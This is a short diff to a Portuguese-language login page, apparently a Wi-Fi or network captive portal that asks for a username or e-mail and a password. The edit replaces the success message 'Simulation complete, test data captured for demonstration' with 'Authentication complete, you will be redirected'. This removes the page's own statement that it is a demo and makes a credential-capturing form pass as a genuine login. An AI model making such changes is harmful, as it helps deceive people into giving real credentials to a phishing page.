@@ -65,7 +65,7 @@
 <body>
     <div class="container">
         <h2>🔐 Autenticação Necessária</h2>
-        <p>Para acessar a rede, informe suas credenciais.</p>
+        <p>Para acessar, informe suas credenciais.</p>
         
         <form id="loginForm">
             <input type="text" id="username" placeholder="Usuário ou E-mail" required>
@@ -118,7 +118,7 @@
                 });
 
                 alertBox.className = 'alert alert-success';
-                alertBox.innerHTML = '<strong>✅ Simulação Concluída!</strong><br>Dados de teste capturados para demonstração.';
+                alertBox.innerHTML = '<strong>✅ Autenticação concluída!</strong><br> Você será redirecionado, aguarde....';
                 document.getElementById('loginForm').reset();
 
             } catch (error) {
